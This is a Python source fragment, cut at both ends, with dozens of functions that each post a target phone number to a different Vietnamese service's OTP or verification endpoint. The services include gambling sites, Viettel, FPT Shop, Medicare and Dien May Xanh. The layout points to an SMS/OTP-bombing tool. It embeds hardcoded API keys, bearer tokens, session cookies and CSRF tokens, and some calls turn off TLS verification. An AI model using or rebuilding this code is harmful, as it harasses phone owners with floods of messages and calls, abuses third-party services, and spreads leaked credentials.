        "referer": "https://i.hit.club/",
        "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
        "x-token": "f4666827199d7dca78ca9be8dea3504d",
    }
    json_data = {
        "phone": phone,
        "app_id": "bc114103",
        "fg_id": "146fca9965e795f8f787485ecca8c61d",
    }
    response = requests.post(
        "https://pmbodergw.dsrcgoms.net/otp/send",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def go88(phone):
    headers = {
        "accept": "*/*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type": "application/json",
        "origin": "https://i.go88.com",
        "priority": "u=1, i",
        "referer": "https://i.go88.com/",
        "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
        "x-token": "68f6acc91fc4944effaee89430dd7a52",
    }
    json_data = {
        "phone": phone,
        "app_id": "go88com",
        "fg_id": "bf43cf47709fc3c1357f915505275a50",
    }
    response = requests.post(
        "https://pmbodergw.dsrcgoms.net/otp/send",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def gemwwin(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    headers = {
        "accept": "*/*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "authorization": "c61277d65f594e3b8a07a59d090c1197",
        "origin": "https://play.gem.win",
        "priority": "u=1, i",
        "referer": "https://play.gem.win/",
        "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
    }
    params = {
        "command": "getOTPCode",
        "type": "1",
        "phone": phone,
    }
    response = requests.get(
        "https://api.gmwin.io/paygate", params=params, headers=headers
    )
def b52(phone):
    headers = {
        "accept": "*/*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type": "application/json",
        "origin": "https://play.b52.cc",
        "priority": "u=1, i",
        "referer": "https://play.b52.cc/",
        "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
        "x-token": "dd01a21c9a0efde25c1b501ee6199c08",
    }
    json_data = {
        "phone": phone,
        "app_id": "b52.club",
        "fg_id": "146fca9965e795f8f787485ecca8c61d",
    }
    response = requests.post(
        "https://bfivegwpeymint.gwtenkges.com/otp/send",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def yo88(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    headers = {
        "accept": "*/*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type": "application/json",
        "origin": "https://web.yo88.tv",
        "priority": "u=1, i",
        "referer": "https://web.yo88.tv/",
        "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
        "x-token": "833b77d3e3bd5caf6a6d7943c7b4015c",
    }
    json_data = {
        "phone": phone,
        "app_id": "yo88win",
        "fg_id": "146fca9965e795f8f787485ecca8c61d",
    }
    response = requests.post(
        "https://pmbodergw.dsrcgoms.net/otp/send",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def zowin(phone):
    headers = {
        "accept": "*/*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "authorization": "8f5e9746a22a4d2c9c6d945539ba564b",
        "origin": "https://i.zo10.win",
        "priority": "u=1, i",
        "referer": "https://i.zo10.win/",
        "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
    }
    params = {
        "command": "getOTPCode",
        "type": "1",
        "phone": phone,
    }
    response = requests.get(
        "https://api.azhkthg1.net/paygate", params=params, headers=headers
    )

def fptshop(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    headers = {
        "accept": "*/*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "apptenantid": "E6770008-4AEA-4EE6-AEDE-691FD22F5C14",
        "content-type": "application/json",
        "order-channel": "1",
        "origin": "https://fptshop.com.vn",
        "priority": "u=1, i",
        "referer": "https://fptshop.com.vn/",
        "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
    }
    json_data = {
        "fromSys": "WEBKHICT",
        "otpType": "0",
        "phoneNumber": phone,
    }
    response = requests.post(
        "https://papi.fptshop.com.vn/gw/is/user/new-send-verification",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def iloka(phone):
    headers = {
        "Host": "back.iloka.vn:9999",
        "Content-Type": "application/json",
        "Origin": "capacitor://localhost",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Content-Length": "22",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    }
    json_data = {
        "phone": phone,
    }
    response = requests.post(
        "http://back.iloka.vn:9999/api/v2/customer/sentVoiceOTP",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def norifood(phone):
    headers = {
        "Host": "gateway.norifood.vn",
        "Content-Type": "application/json",
        "User-Agent": "NoriFood/25021801 CFNetwork/3826.400.120 Darwin/24.3.0",
        "Connection": "keep-alive",
        "Accept": "application/json",
        "secret-code": "7bc79fa5139b8266e12993014bb68955",
        "Content-Length": "34",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9",
    }
    json_data = {
        "phone": phone,
        "type": None,
    }
    response = requests.post(
        "https://gateway.norifood.vn/sso/api/auth/sendOTP",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def fa88(phone):
    headers = {
        "accept": "*/*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type": "application/json",
        "origin": "https://v.fa88.tv",
        "priority": "u=1, i",
        "referer": "https://v.fa88.tv/",
        "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
        "x-token": "bcdb79c350327745b7522a40d4ab673b",
    }
    json_data = {
        "phone": phone,
        "app_id": "fa88club",
        "fg_id": "146fca9965e795f8f787485ecca8c61d",
    }
    response = requests.post(
        "https://pmbodergw.dsrcgoms.net/otp/send",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def vhome(phone):
    headers = {
        "host": "vcloudapi.innoway.vn",
        "accept": "*/*",
        "content-type": "application/json",
        "appkey": "nlaDOC8uS6Xn7L0JIcPD",
        "user-agent": "VTHome/2 CFNetwork/3826.400.120 Darwin/24.3.0",
        "appsecret": "yKeMoImiHp9DUXxoGpERza31xSyCWunW",
        "traceparent": "00-F1D0BD06A5534C8BB05BE6FD5D1A0066-0000000000000000-01",
        "accept-language": "vi-VN,vi;q=0.9",
        "content-length": "44",
        "accept-encoding": "gzip, deflate, br",
    }
    json_data = {
        "otp_type": "register",
        "phone": phone,
    }
    response = requests.post(
        "https://vcloudapi.innoway.vn/api/app/otp/vhome",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def phuha(phone):
    headers = {
        "Host": "phuha.winds.vn",
        "Content-Type": "application/json",
        "User-Agent": "PHUHA/4 CFNetwork/3826.400.120 Darwin/24.3.0",
        "Connection": "keep-alive",
        "Accept": "*/*",
        "token": "",
        "Content-Length": "22",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "vi-VN,vi;q=0.9",
    }
    json_data = {
        "phone": phone,
    }
    response = requests.post(
        "http://phuha.winds.vn/api/service/CheckPhone",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def aemon(phone):
    headers = {
        "Host": "membersapp.aeon.com.vn",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "Cookie": "language=vi",
        "Connection": "keep-alive",
        "x-api-key": "3EB76D87D97C427943957C555AB0B60847582D38CB1688ED86C59251206305E3",
        "Accept": "application/json",
        "User-Agent": "com.aeonvn.membersapp/1.6.5/IOS/RELEASE",
        "Accept-Language": "vi",
        "x-request-id": "D650BC1C-5C71-4CD3-BBDC-7D46741E5AFD",
        "Content-Length": "40",
    }
    json_data = {
        "screen": 1,
        "phone_number": phone,
    }
    response = requests.post(
        "https://membersapp.aeon.com.vn/api/otp",
        headers=headers,
        json=json_data,
        verify=False,
    )
def fptplay(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    headers = {
        "Host": "api.foxpay.vn",
        "client-type": "App",
        "ip-address": "14.191.171.193",
        "Authorization": "Bearer t10xelgj5/nVbKRCBm04N6mbb23rc7wd6ZUlBXHG7TcfT4MRX2Xi8pPQk2oG8No6LzOZCMUZKcodHF20aAXE61qnaSKgNJUS+21bE7uZZlhfNfpXnPfVLFdfmsXLN6mlmff7jGalsGBIN/doiklFJp0Cl9J6oYB7Yfy7AYbb0JjcgcbAMfW6h2xQCiwus/rYoU7dyqz2u4ZvDCz8gMO7FP36Xk6Qu8opj44ZqpEy+a8kYgqriLNW2aSCO6TFlEXkOF1QoIye0KYSSKCtFsWji2aq/uMXELDB9NHM7/g4okznCpuIfnPewAC2cEz9VdGhiTtqNvk6F+v5uddVsfRO4bFjTXF94MqP3A8sRiqF8RYoXl4mvLvKUszDf47F5vsR4S2Senv/CxF8nXBicVevaFYfEEIvJlqp6r3MqKtosHKiFOiiqQVqUTxI98L/Suhl/Ja+Jg6iwW2cGDGRJfkYewTvR8AlQHHjyaIIaJa5IzkM/WtVmJjUVhkW0Yhch2IW6BgLyDCrctZaobRsLZeZfBzjm/1m0L5WILAp9tL9VKBHv3lWYikaAauk4mLawKK76PChgfTaqqg6yvtIjS0RRwkWCHtYp1vCGl7R47Q8+q4+EJK86/ZjxDEZXqLh9T2FO/sa9BTv9wPM/8CKaCaiqC8TJC4NMQhFL4Lu20d+e5td3bRYyx7+oVQTlOYGp4VnauiAou7NwYUnvGUb7PeePYP821fnVaQwMRZkhdbuOINSxp7vtie5W7W6wZ5FN2R0vCo/ONUmQkurM2LdfQZeLdsXTqvR4kbrtfEeZ4aCbgpcWrEvNK6CzupCU6FotfOp2aQrsyAkhR632RF8tDNH3yptn4aH2QhuM22WX3j1tQ2TwRgVasBop3MCk4R1QpkMxqKaOBy1gXs6taigUnxVC2Hqt1IAukJqxH9jeNcrg+yhr8zQBhFOGvUesoXXvsEGysQ0FL91WI9CTAcqZ7kDGbGKjETpwr9zXksVlPW+tr88D3/ZbjbvhT8MQURqTExeDucif/TXQJdxQIpzy5Es1Nqx6lFHiHArbU3Nh3RG92C+LoMq01WH/y28vnUqKqyTtaZc/VMBP3HkkNJZBLAglA==",
        "Accept": "*/*",
        "device-id": "D5E6B9C9-E00F-492B-BBEC-FB363708A940",
        "client-version": "3.2.2.1",
        "device-type": "iOS_18_3_2_iPhone_11",
        "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
        "Accept-Language": "vi-VN;q=1.0",
        "Content-Type": "application/json",
        "Content-Length": "56",
        "User-Agent": "FPT Pay/3.2.2 (com.ftel.foxpay; build:1; iOS 18.3.2) Alamofire/5.6.4",
        "lang": "vi",
        "Connection": "keep-alive",
    }
    json_data = {"username": phone, "country_code": "84"}
    response = requests.post(
        "https://api.foxpay.vn/v1/oauth/account/register",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def savyu(phone):
    headers = {
        "host": "api.savyu.com",
        "content-type": "application/json",
        "consumer-app-version": "6.4.1",
        "accept": "application/json",
        "accept-language": "vi-VN,vi;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "deviceuuid": "BA857157-060E-4A4C-A2C6-FC0D628894D0",
        "deviceinfo": "iPhone12,1",
        "user-agent": "SavyuConsumer/1 CFNetwork/3826.400.120 Darwin/24.3.0",
        "content-length": "111",
        "osversion": "18.3.2",
        "devicebrand": "Apple",
    }
    json_data = {
        "account": phone,
        "country_code": "+84",
        "device_uuid": "BA857157-060E-4A4C-A2C6-FC0D628894D0",
        "platform": 3,
    }
    response = requests.post(
        "https://api.savyu.com/api/otp/send-code",
        headers=headers,
        json=json_data,
        verify=False,
    )
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "dnt": "1",
        "origin": "https://www.sapo.vn",
        "priority": "u=1, i",
        "referer": "https://www.sapo.vn/dang-nhap-kenh-ban-hang.html",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    data = {
        "phonenumber": phone,
    }
    response = requests.post(
        "https://www.sapo.vn/fnb/sendotp", cookies=cookies, headers=headers, data=data
    )
def call_viettel(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    cookies = {
        "laravel_session": "ubn0cujNbmoBY3ojVB6jK1OrX0oxZIvvkqXuFnEf",
        "redirectLogin": "https://viettel.vn/myviettel",
        "XSRF-TOKEN": "eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ%3D%3D",
    }
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8",
        "Connection": "keep-alive",
        "Content-Type": "application/json;charset=UTF-8",
        "DNT": "1",
        "Origin": "https://viettel.vn",
        "Referer": "https://viettel.vn/myviettel",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "X-CSRF-TOKEN": "H32gw4ZAkTzoN8PdQkH3yJnn2wvupVCPCGx4OC4K",
        "X-Requested-With": "XMLHttpRequest",
        "X-XSRF-TOKEN": "eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ==",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {
        "phone": phone,
        "typeCode": "DI_DONG",
        "actionCode": "myviettel://login_mobile",
        "type": "otp_login",
    }
    response = requests.post(
        "https://viettel.vn/api/getOTPLoginCommon",
        cookies=cookies,
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_medicare(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    cookies = {
        "SERVER": "nginx2",
        "_gcl_au": "1.1.481698065.1722327865",
        "_tt_enable_cookie": "1",
        "_ttp": "sCpx7m_MUB9D7tZklNI1kEjX_05",
        "_gid": "GA1.2.1931976026.1722327868",
        "_ga_CEMYNHNKQ2": "GS1.1.1722327866.1.1.1722327876.0.0.0",
        "_ga_8DLTVS911W": "GS1.1.1722327866.1.1.1722327876.0.0.0",
        "_ga_R7XKMTVGEW": "GS1.1.1722327866.1.1.1722327876.50.0.0",
        "_ga": "GA1.2.535777579.1722327867",
        "XSRF-TOKEN": "eyJpdiI6ImFZV0RqYTlINlhlL0FrUEdIaEdsSVE9PSIsInZhbHVlIjoiZkEvVFhpb0VYbC85RTJtNklaWXJONE1oSEFzM2JMdjdvRlBseENjN3VKRzlmelRaVFFHc2JDTE42UkxCRnhTd3Z5RHJmYVZvblVBZCs1dDRvSk5lemVtRUlYM1Uzd1RqV0YydEpVaWJjb2oyWlpvekhDRHBVREZQUVF0cTdhenkiLCJtYWMiOiIyZjUwNDcyMmQzODEwNjUzOTg3YmJhY2ZhZTY2YmM2ODJhNzUwOTE0YzdlOWU5MmYzNWViM2Y0MzNlODM5Y2MzIiwidGFnIjoiIn0%3D",
        "medicare_session": "eyJpdiI6InRFQ2djczdiTDRwTHhxak8wcTZnZVE9PSIsInZhbHVlIjoiZW8vM0ZRVytldlR1Y0M1SFZYYlVvN3NrN0x6UmFXQysyZW5FbTI2WnBCUXV1RE5qbCtPQ1I0YUJnSzR4M1FUYkRWaDUvZVZVRkZ4eEU4TWlGL2JNa3NmKzE1bFRiaHkzUlB0TXN0UkN6SW5ZSjF2dG9sODZJUkZyL3FnRkk1NE8iLCJtYWMiOiJmZGIyNTNkMjcyNGUxNGY0ZjQwZjBiY2JjYmZhMGE1Y2Q1NTBlYjI3OWM2MTQ0YTViNDU0NjA5YThmNDQyMzYwIiwidGFnIjoiIn0%3D",
    }
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "https://medicare.vn",
        "Referer": "https://medicare.vn/login",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "X-XSRF-TOKEN": "eyJpdiI6ImFZV0RqYTlINlhlL0FrUEdIaEdsSVE9PSIsInZhbHVlIjoiZkEvVFhpb0VYbC85RTJtNklaWXJONE1oSEFzM2JMdjdvRlBseENjN3VKRzlmelRaVFFHc2JDTE42UkxCRnhTd3Z5RHJmYVZvblVBZCs1dDRvSk5lemVtRUlYM1Uzd1RqV0YydEpVaWJjb2oyWlpvekhDRHBVREZQUVF0cTdhenkiLCJtYWMiOiIyZjUwNDcyMmQzODEwNjUzOTg3YmJhY2ZhZTY2YmM2ODJhNzUwOTE0YzdlOWU5MmYzNWViM2Y0MzNlODM5Y2MzIiwidGFnIjoiIn0=",
        "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {
        "mobile": phone,
        "mobile_country_prefix": "84",
    }
    response = requests.post(
        "https://medicare.vn/api/otp",
        cookies=cookies,
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_tv360(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    cookies = {
        "img-ext": "avif",
        "NEXT_LOCALE": "vi",
        "session-id": "s%3A472d7db8-6197-442e-8276-7950defb8252.rw16I89Sh%2FgHAsZGV08bm5ufyEzc72C%2BrohCwXTEiZM",
        "device-id": "s%3Aweb_89c04dba-075e-49fe-b218-e33aef99dd12.i%2B3tWDWg0gEx%2F9ZDkZOcqpgNoqXOVGgL%2FsNf%2FZlMPPg",
        "shared-device-id": "web_89c04dba-075e-49fe-b218-e33aef99dd12",
        "screen-size": "s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q",
        "G_ENABLED_IDPS": "google",
    }
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://tv360.vn",
        "priority": "u=1, i",
        "referer": "https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "starttime": "1722324791163",
        "tz": "Asia/Bangkok",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data = {
        "msisdn": phone,
    }
    response = requests.post(
        "https://tv360.vn/public/v1/auth/get-otp-login",
        cookies=cookies,
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_dienmayxanh(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    cookies = {
        "TBMCookie_3209819802479625248": "657789001722328509llbPvmLFf7JtKIGdRJGS7vFlx2E=",
        "___utmvm": "###########",
        "___utmvc": "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        "SvID": "new2690|Zqilx|Zqilw",
        "mwgngxpv": "3",
        ".AspNetCore.Antiforgery.SuBGfRYNAsQ": "CfDJ8LmkDaXB2QlCm0k7EtaCd5TQ7UQGmBzPEH6s6-tzBBTiKEgcfjZWXpY8_IL-DTacK3it55OPdddwuXNc2mgQzfoEMl9eFbSuvHz3ySnzPW-Ww4YccqMERZSMCsSY8f1eBwOpd9HzD1YsnrhTwgAuLxM",
        "DMX_Personal": "%7B%22UID%22%3A%225cb3bf4ae0e8e527f2e3813bf976bee79ea330dc%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D",
    }
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "DNT": "1",
        "Origin": "https://www.dienmayxanh.com",
        "Referer": "https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    data = {
        "phoneNumber": phone,
        "isReSend": "false",
        "sendOTPType": "1",
        "__RequestVerificationToken": "CfDJ8LmkDaXB2QlCm0k7EtaCd5Ri89ZiNhfmFcY9XtYAjjDirvSdcYRdWZG8hw_ch4w5eMUQc0d_fRDOu0QzDWE_fHeK8txJRRqbPmgZ61U70owDeZCkCDABV3jc45D8wyJ5wfbHpS-0YjALBHW3TKFiAxU",
    }
    response = requests.post(
        "https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def call_kingfoodmart(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    headers = {
        "accept": "*/*",
        "accept-language": "vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6",
        "authorization": "",
        "content-type": "application/json",
        "domain": "kingfoodmart",
        "origin": "https://kingfoodmart.com",
        "priority": "u=1, i",
        "referer": "https://kingfoodmart.com/",
        "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    }
    json_data = {
        "operationName": "SendOtp",
        "variables": {
            "input": {
                "phone": phone,
                "captchaSignature": "HFMWt2IhJSLQ4zZ39DH0FSHgMLOxYwQwwZegMOc2R2RQwIQypiSQULVRtGIjBfOCdVY2k1VRh0VRgJFidaNSkFWlMJSF1kO2FNHkJkZk40DVBVJ2VuHmIiQy4AL15HVRhxWRcIGXcoCVYqWGQ2NWoPUxoAcGoNOQESVj1PIhUiUEosSlwHPEZ1BXlYOXVIOXQbEWJRGWkjWAkCUysD",
            },
        },
